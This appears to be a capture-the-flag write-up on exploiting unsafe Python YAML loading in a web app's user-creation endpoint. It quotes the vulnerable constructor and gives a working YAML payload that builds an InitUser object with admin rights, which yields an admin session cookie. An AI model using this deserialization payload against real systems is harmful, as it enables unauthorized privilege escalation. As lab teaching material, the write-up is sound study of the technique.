# YAML

Python can load YAML in either safe or unsafe mode. For some reason, you can create arbitrary python objects through YAML. Because of this, we can interact with the user creation function however we want. Looking at the source code we can find this:
```py
def __init__(self, info):
	userinfo = info.get("user", info)



	if isinstance(userinfo, dict):
		self.username = userinfo["username"]
		self.notes = []
		self.is_admin = False

	elif isinstance(userinfo, InitUser):
		# copy over attributes from other User object
		for attr in user_attrs:
			setattr(self, attr, getattr(userinfo, attr))
```

Since this can be interacted with via POST requests, we can submit YAML data as our payload instead of the expected username. We can use this YAML snippet to create a new `InitUser` object with admin permissions:
```YAML
user: !!python/object:classes.InitUser
    username: admin
    notes:  []
    is_admin: True
```

This request returns a cookie containing a session ID for an admin user. We can set our session ID to this cookie to access the /admin page, which has the flag.
